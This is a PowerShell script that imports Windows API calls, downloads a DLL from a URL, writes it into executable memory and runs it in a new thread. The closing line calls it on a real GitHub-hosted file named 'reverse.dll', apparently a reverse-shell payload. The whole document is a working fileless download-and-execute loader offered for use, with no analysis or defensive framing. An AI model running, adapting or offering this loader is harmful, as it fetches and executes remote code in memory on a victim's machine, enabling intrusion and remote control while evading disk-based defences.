# Import necessary Windows API functions using P/Invoke
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

# Function to download the DLL from a given URL
function Download-DLL {
    param (
        [string]$Url
    )
    
    try {
        Write-Host "[*] Downloading DLL from $Url"
        $dllBytes = (New-Object System.Net.WebClient).DownloadData($Url)
        Write-Host "[+] DLL downloaded successfully"
        return $dllBytes
    } catch {
        Write-Host "[!] Failed to download DLL: $_"
        return $null
    }
}

# Function to load and execute the DLL in memory
function Invoke-DLLInMemory {
    param (
        [string]$DllUrl
    )

    # Step 1: Download the DLL from the web
    $dllBytes = Download-DLL -Url $DllUrl
    
    if (-not $dllBytes) {
        Write-Host "[!] DLL download failed. Exiting."
        return
    }

    Write-Host "[*] Allocating memory for DLL..."

    # Step 2: Allocate memory for the DLL
    $memSize = $dllBytes.Length
    $allocation = [Win32]::VirtualAlloc([IntPtr]::Zero, $memSize, 0x1000 -bor 0x2000, 0x40)
    
    if ($allocation -eq [IntPtr]::Zero) {
        Write-Host "[!] Memory allocation failed."
        return
    }

    Write-Host "[*] Copying DLL into memory..."

    # Step 3: Copy the DLL into the allocated memory
    [System.Runtime.InteropServices.Marshal]::Copy($dllBytes, 0, $allocation, $memSize)

    Write-Host "[*] Creating thread to execute the DLL in memory..."

    # Step 4: Create a thread to execute the DLL
    $hThread = [Win32]::CreateThread([IntPtr]::Zero, 0, $allocation, [IntPtr]::Zero, 0, [IntPtr]::Zero)
    
    if ($hThread -eq [IntPtr]::Zero) {
        Write-Host "[!] Failed to create thread for DLL execution."
        [Win32]::VirtualFree($allocation, 0, 0x8000)
        return
    }

    Write-Host "[*] Waiting for thread to finish execution..."

    # Step 5: Wait for the thread to finish executing
    [Win32]::WaitForSingleObject($hThread, 0xFFFFFFFF)

    # Step 6: Clean up
    Write-Host "[*] Cleaning up memory and thread handle..."
    [Win32]::CloseHandle($hThread)
    [Win32]::VirtualFree($allocation, 0, 0x8000)

    Write-Host "[+] DLL executed successfully from memory."
}

# Example usage: Replace with your DLL URL
Invoke-DLLInMemory -DllUrl "https://github.com/AlexTriumf/pst/raw/refs/heads/main/reverse.dll"
